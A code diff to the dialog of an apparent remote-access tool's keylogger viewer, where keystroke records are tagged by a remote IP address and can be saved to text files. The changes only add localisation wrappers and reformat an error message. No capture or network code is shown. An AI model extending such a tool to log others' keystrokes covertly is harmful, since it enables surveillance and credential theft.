@@ -87,11 +87,11 @@ BOOL CKeyBoardDlg::OnInitDialog()
 void CKeyBoardDlg::UpdateTitle()
 {
     CString str;
-    str.FormatL(_T("%s - 键盘记录"), m_IPAddress);
+    str.FormatL("%s - 键盘记录", m_IPAddress);
     if (m_bIsOfflineRecord)
-        str += " (离线记录已开启)";
+        str += _TR(" (离线记录已开启)");
     else
-        str += " (离线记录未开启)";
+        str += _TR(" (离线记录未开启)");
     SetWindowText(str);
 }
 
@@ -118,13 +118,15 @@ void CKeyBoardDlg::AddKeyBoardData()
 bool CKeyBoardDlg::SaveRecord()
 {
     CString	strFileName = m_IPAddress + CTime::GetCurrentTime().FormatL("_%Y-%m-%d_%H-%M-%S.txt");
-    CFileDialog dlg(FALSE, "txt", strFileName, OFN_OVERWRITEPROMPT, "文本文档(*.txt)|*.txt|", this);
+    CFileDialog dlg(FALSE, "txt", strFileName, OFN_OVERWRITEPROMPT, _TR("文本文档(*.txt)|*.txt|"), this);
     if(dlg.DoModal () != IDOK)
         return false;
 
     CFile	file;
     if (!file.Open( dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate)) {
-        MessageBoxL("文件保存失败："+dlg.GetPathName(), "提示", MB_ICONINFORMATION);
+        CString msg;
+        msg.FormatL("文件保存失败: %s", dlg.GetPathName().GetString());
+        MessageBox(msg, _TR("提示"), MB_ICONINFORMATION);
         return false;
     }
     // Write the DIB header and the bits
